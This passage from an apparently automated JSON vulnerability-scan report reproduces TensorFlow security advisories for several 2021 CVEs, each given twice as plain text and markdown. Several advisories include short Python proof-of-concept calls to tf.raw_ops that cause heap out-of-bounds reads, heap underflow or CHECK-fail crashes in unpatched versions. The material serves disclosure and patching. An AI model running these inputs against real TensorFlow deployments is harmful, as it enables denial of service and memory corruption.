GitHub commit [698e01511f62a3c185754db78ebce0eee1f0184d](https://github.com/tensorflow/tensorflow/commit/698e01511f62a3c185754db78ebce0eee1f0184d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29551",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29551"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29551",
              "help": {
                "text": "Vulnerability CVE-2021-29551\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29551](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29551)\n### Impact\nThe implementation of [`MatrixTriangularSolve`](https://github.com/tensorflow/tensorflow/blob/8cae746d8449c7dda5298327353d68613f16e798/tensorflow/core/kernels/linalg/matrix_triangular_solve_op_impl.h#L160-L240) fails to terminate kernel execution if one validation condition fails:\n\n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor\u0026 in0,\n                            const Tensor\u0026 in1) override {\n  OP_REQUIRES(\n      ctx, in0.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in1.dims()));\n}\n  \nvoid Compute(OpKernelContext* ctx) override {\n  const Tensor\u0026 in0 = ctx-\u003einput(0);\n  const Tensor\u0026 in1 = ctx-\u003einput(1);\n\n  ValidateInputTensors(ctx, in0, in1);\n\n  MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\n  ...\n}\n```\n  \nSince `OP_REQUIRES` only sets `ctx-\u003estatus()` to a non-OK value and calls `return`, this allows malicious attackers to trigger an out of bounds read:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)\nrhs_array = np.array([])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)\n\ntf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)\n```\n\nAs the two input tensors are empty, the `OP_REQUIRES` in `ValidateInputTensors` should fire and interrupt execution. However, given the implementation of `OP_REQUIRES`, after the `in0.dims() \u003e= 2` fails, execution moves to the initialization of the `bcast` object. This initialization is done with invalid data and results in heap OOB read.\n\n### Patches\nWe have patched the issue in GitHub commit [480641e3599775a8895254ffbc0fc45621334f68](https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29551**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29551](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29551)|\n\n### Impact\nThe implementation of [`MatrixTriangularSolve`](https://github.com/tensorflow/tensorflow/blob/8cae746d8449c7dda5298327353d68613f16e798/tensorflow/core/kernels/linalg/matrix_triangular_solve_op_impl.h#L160-L240) fails to terminate kernel execution if one validation condition fails:\n\n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor\u0026 in0,\n                            const Tensor\u0026 in1) override {\n  OP_REQUIRES(\n      ctx, in0.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in1.dims()));\n}\n  \nvoid Compute(OpKernelContext* ctx) override {\n  const Tensor\u0026 in0 = ctx-\u003einput(0);\n  const Tensor\u0026 in1 = ctx-\u003einput(1);\n\n  ValidateInputTensors(ctx, in0, in1);\n\n  MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\n  ...\n}\n```\n  \nSince `OP_REQUIRES` only sets `ctx-\u003estatus()` to a non-OK value and calls `return`, this allows malicious attackers to trigger an out of bounds read:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)\nrhs_array = np.array([])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)\n\ntf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)\n```\n\nAs the two input tensors are empty, the `OP_REQUIRES` in `ValidateInputTensors` should fire and interrupt execution. However, given the implementation of `OP_REQUIRES`, after the `in0.dims() \u003e= 2` fails, execution moves to the initialization of the `bcast` object. This initialization is done with invalid data and results in heap OOB read.\n\n### Patches\nWe have patched the issue in GitHub commit [480641e3599775a8895254ffbc0fc45621334f68](https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29616",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29616"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29616",
              "help": {
                "text": "Vulnerability CVE-2021-29616\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29616](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29616)\n### Impact\nThe implementation of [`TrySimplify`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/grappler/optimizers/arithmetic_optimizer.cc#L390-L401) has undefined behavior due to dereferencing a null pointer in corner cases that\nresult in optimizing a node with no inputs.\n\n### Patches\nWe have patched the issue in GitHub commit [e6340f0665d53716ef3197ada88936c2a5f7a2d3](https://github.com/tensorflow/tensorflow/commit/e6340f0665d53716ef3197ada88936c2a5f7a2d3).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-29616**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29616](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29616)|\n\n### Impact\nThe implementation of [`TrySimplify`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/grappler/optimizers/arithmetic_optimizer.cc#L390-L401) has undefined behavior due to dereferencing a null pointer in corner cases that\nresult in optimizing a node with no inputs.\n\n### Patches\nWe have patched the issue in GitHub commit [e6340f0665d53716ef3197ada88936c2a5f7a2d3](https://github.com/tensorflow/tensorflow/commit/e6340f0665d53716ef3197ada88936c2a5f7a2d3).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29531",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29531"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29531",
              "help": {
                "text": "Vulnerability CVE-2021-29531\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29531)\n### Impact\nAn attacker can trigger a `CHECK` fail in PNG encoding by providing an empty input tensor as the pixel data:\n\n```python\nimport tensorflow as tf\n\nimage = tf.zeros([0, 0, 3])\nimage = tf.cast(image, dtype=tf.uint8) \ntf.raw_ops.EncodePng(image=image) \n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L57-L60) only validates that the total number of pixels in the image does not overflow. Thus, an attacker can send an empty matrix for encoding. However, if the tensor is empty, then the associated buffer is `nullptr`. Hence, when [calling `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L79-L93), the first argument (i.e., `image.flat\u003cT\u003e().data()`) is `NULL`. This then triggers the `CHECK_NOTNULL` in the [first line of `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/lib/png/png_io.cc#L345-L349).\n\n```cc\ntemplate \u003ctypename T\u003e\nbool WriteImageToBuffer(\n    const void* image, int width, int height, int row_bytes, int num_channels,\n    int channel_bits, int compression, T* png_string,\n    const std::vector\u003cstd::pair\u003cstd::string, std::string\u003e \u003e* metadata) {\n  CHECK_NOTNULL(image);\n  ...\n}\n```\n\nSince `image` is null, this results in `abort` being called after printing the stacktrace. Effectively, this allows an attacker to mount a denial of service attack.\n\n### Patches\nWe have patched the issue in GitHub commit [26eb323554ffccd173e8a79a8c05c15b685ae4d1](https://github.com/tensorflow/tensorflow/commit/26eb323554ffccd173e8a79a8c05c15b685ae4d1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29531**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29531)|\n\n### Impact\nAn attacker can trigger a `CHECK` fail in PNG encoding by providing an empty input tensor as the pixel data:\n\n```python\nimport tensorflow as tf\n\nimage = tf.zeros([0, 0, 3])\nimage = tf.cast(image, dtype=tf.uint8) \ntf.raw_ops.EncodePng(image=image) \n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L57-L60) only validates that the total number of pixels in the image does not overflow. Thus, an attacker can send an empty matrix for encoding. However, if the tensor is empty, then the associated buffer is `nullptr`. Hence, when [calling `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L79-L93), the first argument (i.e., `image.flat\u003cT\u003e().data()`) is `NULL`. This then triggers the `CHECK_NOTNULL` in the [first line of `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/lib/png/png_io.cc#L345-L349).\n\n```cc\ntemplate \u003ctypename T\u003e\nbool WriteImageToBuffer(\n    const void* image, int width, int height, int row_bytes, int num_channels,\n    int channel_bits, int compression, T* png_string,\n    const std::vector\u003cstd::pair\u003cstd::string, std::string\u003e \u003e* metadata) {\n  CHECK_NOTNULL(image);\n  ...\n}\n```\n\nSince `image` is null, this results in `abort` being called after printing the stacktrace. Effectively, this allows an attacker to mount a denial of service attack.\n\n### Patches\nWe have patched the issue in GitHub commit [26eb323554ffccd173e8a79a8c05c15b685ae4d1](https://github.com/tensorflow/tensorflow/commit/26eb323554ffccd173e8a79a8c05c15b685ae4d1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29600",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29600"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29600",
              "help": {
                "text": "Vulnerability CVE-2021-29600\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29600](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29600)\n### Impact\nThe implementation of the `OneHot` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/f61c57bd425878be108ec787f4d96390579fb83e/tensorflow/lite/kernels/one_hot.cc#L68-L72):\n\n```cc\nint prefix_dim_size = 1;\nfor (int i = 0; i \u003c op_context.axis; ++i) {\n  prefix_dim_size *= op_context.indices-\u003edims-\u003edata[i];\n}\nconst int suffix_dim_size = NumElements(op_context.indices) / prefix_dim_size;\n```\n\nAn attacker can craft a model such that at least one of the dimensions of `indices` would be 0. In turn, the `prefix_dim_size` value would become 0.\n\n### Patches\nWe have patched the issue in GitHub commit [3ebedd7e345453d68e279cfc3e4072648e5e12e5](https://github.com/tensorflow/tensorflow/commit/3ebedd7e345453d68e279cfc3e4072648e5e12e5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29600**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29600](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29600)|\n\n### Impact\nThe implementation of the `OneHot` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/f61c57bd425878be108ec787f4d96390579fb83e/tensorflow/lite/kernels/one_hot.cc#L68-L72):\n\n```cc\nint prefix_dim_size = 1;\nfor (int i = 0; i \u003c op_context.axis; ++i) {\n  prefix_dim_size *= op_context.indices-\u003edims-\u003edata[i];\n}\nconst int suffix_dim_size = NumElements(op_context.indices) / prefix_dim_size;\n```\n\nAn attacker can craft a model such that at least one of the dimensions of `indices` would be 0. In turn, the `prefix_dim_size` value would become 0.\n\n### Patches\nWe have patched the issue in GitHub commit [3ebedd7e345453d68e279cfc3e4072648e5e12e5](https://github.com/tensorflow/tensorflow/commit/3ebedd7e345453d68e279cfc3e4072648e5e12e5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29615",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29615"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29615",
              "help": {
                "text": "Vulnerability CVE-2021-29615\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29615](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29615)\n### Impact\nThe implementation of [`ParseAttrValue`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/framework/attr_value_util.cc#L397-L453) can be tricked into stack overflow due to recursion by giving in a specially crafted input.\n\n### Patches\nWe have patched the issue in GitHub commit [e07e1c3d26492c06f078c7e5bf2d138043e199c1](https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-29615**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29615](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29615)|\n\n### Impact\nThe implementation of [`ParseAttrValue`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/framework/attr_value_util.cc#L397-L453) can be tricked into stack overflow due to recursion by giving in a specially crafted input.\n\n### Patches\nWe have patched the issue in GitHub commit [e07e1c3d26492c06f078c7e5bf2d138043e199c1](https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29610",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29610"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29610",
              "help": {
                "text": "Vulnerability CVE-2021-29610\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29610](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29610)\n### Impact\nThe validation in `tf.raw_ops.QuantizeAndDequantizeV2` allows invalid values for `axis` argument:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([0.0], shape=[1], dtype=float)\ninput_min = tf.constant(-10.0)\ninput_max = tf.constant(-10.0)\n\ntf.raw_ops.QuantizeAndDequantizeV2(\n  input=input_tensor, input_min=input_min, input_max=input_max,\n  signed_input=False, num_bits=1, range_given=False, round_mode=`HALF_TO_EVEN`,\n  narrow_range=False, axis=-2)\n``` \n\nThe [validation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74-L77) uses `||` to mix two different conditions:\n\n```cc\nOP_REQUIRES(ctx,\n  (axis_ == -1 || axis_ \u003c input.shape().dims()),\n  errors::InvalidArgument(...));\n```\n\nIf `axis_ \u003c -1` the condition in `OP_REQUIRES` will still be true, but this value of `axis_` results in heap underflow. This allows attackers to read/write to other data on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9](https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29610**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29610](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29610)|\n\n### Impact\nThe validation in `tf.raw_ops.QuantizeAndDequantizeV2` allows invalid values for `axis` argument:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([0.0], shape=[1], dtype=float)\ninput_min = tf.constant(-10.0)\ninput_max = tf.constant(-10.0)\n\ntf.raw_ops.QuantizeAndDequantizeV2(\n  input=input_tensor, input_min=input_min, input_max=input_max,\n  signed_input=False, num_bits=1, range_given=False, round_mode=`HALF_TO_EVEN`,\n  narrow_range=False, axis=-2)\n``` \n\nThe [validation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74-L77) uses `||` to mix two different conditions:\n\n```cc\nOP_REQUIRES(ctx,\n  (axis_ == -1 || axis_ \u003c input.shape().dims()),\n  errors::InvalidArgument(...));\n```\n\nIf `axis_ \u003c -1` the condition in `OP_REQUIRES` will still be true, but this value of `axis_` results in heap underflow. This allows attackers to read/write to other data on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9](https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "3.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29534",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29534"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29534",
              "help": {
                "text": "Vulnerability CVE-2021-29534\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29534](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29534)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.SparseConcat`: \n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nindices_1 = tf.constant([[514, 514], [514, 514]], dtype=tf.int64)\nindices_2 = tf.constant([[514, 530], [599, 877]], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.zeros([0], dtype=tf.int64)\nvalues_2 = tf.zeros([0], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nshape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)\nshape_2 = tf.zeros([9], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ntf.raw_ops.SparseConcat(indices=indices, values=values, shapes=shapes, concat_dim=2)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b432a38fe0e1b4b904a6c222cbce794c39703e87/tensorflow/core/kernels/sparse_concat_op.cc#L76) takes the values specified in `shapes[0]` as dimensions for the output shape:\n\n```cc\nTensorShape input_shape(shapes[0].vec\u003cint64\u003e());\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n\n```cc\ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29534**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29534](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29534)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.SparseConcat`: \n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nindices_1 = tf.constant([[514, 514], [514, 514]], dtype=tf.int64)\nindices_2 = tf.constant([[514, 530], [599, 877]], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.zeros([0], dtype=tf.int64)\nvalues_2 = tf.zeros([0], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nshape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)\nshape_2 = tf.zeros([9], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ntf.raw_ops.SparseConcat(indices=indices, values=values, shapes=shapes, concat_dim=2)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b432a38fe0e1b4b904a6c222cbce794c39703e87/tensorflow/core/kernels/sparse_concat_op.cc#L76) takes the values specified in `shapes[0]` as dimensions for the output shape:\n\n```cc\nTensorShape input_shape(shapes[0].vec\u003cint64\u003e());\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when 